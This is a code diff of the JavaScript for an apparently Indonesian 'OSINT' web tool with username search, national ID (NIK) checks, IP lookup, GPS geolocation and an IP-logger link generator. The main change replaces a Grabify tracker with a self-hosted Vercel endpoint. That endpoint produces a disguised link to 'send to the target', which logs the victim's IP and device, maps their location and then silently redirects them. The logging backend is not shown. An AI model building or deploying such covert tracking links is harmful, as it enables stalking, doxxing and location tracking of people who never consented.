@@ -1,4 +1,4 @@
-// FUNGSI 1: SWITCH TAB MENU
+// FUNGSI 1: NAVIGATION TAB SWITCHER
 function showTab(tabName, btn) {
   document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -7,7 +7,7 @@ function showTab(tabName, btn) {
   btn.classList.add('active');
 }
 
-// FUNGSI 2: SEARCH USERNAME
+// FUNGSI 2: OSINT USERNAME SEARCH
 function checkUsername() {
   const u = document.getElementById('inputUser').value.trim();
   if (!u) return alert('Isi username dulu!');
@@ -55,7 +55,7 @@ function checkNik() {
   `;
 }
 
-// FUNGSI 4A: IP LOCATION API
+// FUNGSI 4A: IP LOOKUP API
 async function checkIp() {
   const ip = document.getElementById('inputIp').value.trim();
   const res = document.getElementById('resIp');
@@ -80,7 +80,7 @@ async function checkIp() {
   }
 }
 
-// FUNGSI 4B: GEOLOCATION API (PRESISI GPS)
+// FUNGSI 4B: BROWSER GPS GEOLOCATION
 function getExactLocation() {
   const res = document.getElementById('resIp');
   
@@ -111,26 +111,27 @@ function getExactLocation() {
   );
 }
 
-// FUNGSI 5: IP LOGGER LINK GENERATOR
-function createLoggerLink() {
-  let target = document.getElementById('targetUrl').value.trim();
+// FUNGSI 5: NATIVE IP LOGGER GENERATOR
+function generateCustomLink() {
+  const target = document.getElementById('targetUrl').value.trim();
   const res = document.getElementById('resLogger');
 
   if (!target) return alert('Masukkan URL tujuan dulu!');
-  if (!target.startsWith('http://') && !target.startsWith('https://')) {
-    target = 'https://' + target;
-  }
 
-  const grabifyCreateUrl = `https://grabify.link/track?url=${encodeURIComponent(target)}`;
+  // Mengambil domain Vercel lu secara otomatis
+  const currentDomain = window.location.origin;
   
+  // Custom link yang ngarah ke Serverless API /api/log.js
+  const trackingLink = `${currentDomain}/api/log?url=${encodeURIComponent(target)}`;
+
   res.innerHTML = `
-    <div style="color: #34d399; font-weight: bold; margin-bottom: 10px;">[ TRACKER CREATED ]</div>
-    <div class="item">
-      <span>1. Buka Engine Logger:</span> 
-      <a href="${grabifyCreateUrl}" target="_blank" class="link">Buat Tracking Link -></a>
+    <div style="color: #ef4444; font-weight: bold; margin-bottom: 8px;">[ TRACKING LINK BERHASIL DIBUAT ]</div>
+    <div style="margin-bottom: 10px;">
+      <p style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Kirim link ini ke target:</p>
+      <input type="text" value="${trackingLink}" readonly style="width:100%; padding: 8px; background:#0f172a; border:1px solid #334155; color:#34d399; font-size:12px; border-radius:4px;" onclick="this.select()">
     </div>
-    <p style="font-size: 11px; color: #94a3b8; margin-top: 8px;">
-      *Klik link di atas untuk secara otomatis mendapatkan <b>Tracking Link</b> yang siap dikirim ke target beserta akses ke <b>Dashboard Logs</b>.
+    <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
+      ⚡ <b>Alur Kerja:</b> Ketika target membuka link di atas, sistem akan <b>Ngelog IP & Perangkat</b> + <b>Auto-Locate Peta Google Maps</b> di Vercel Logs, lalu target dialihkan ke <b>${target}</b>.
     </p>
   `;
 }
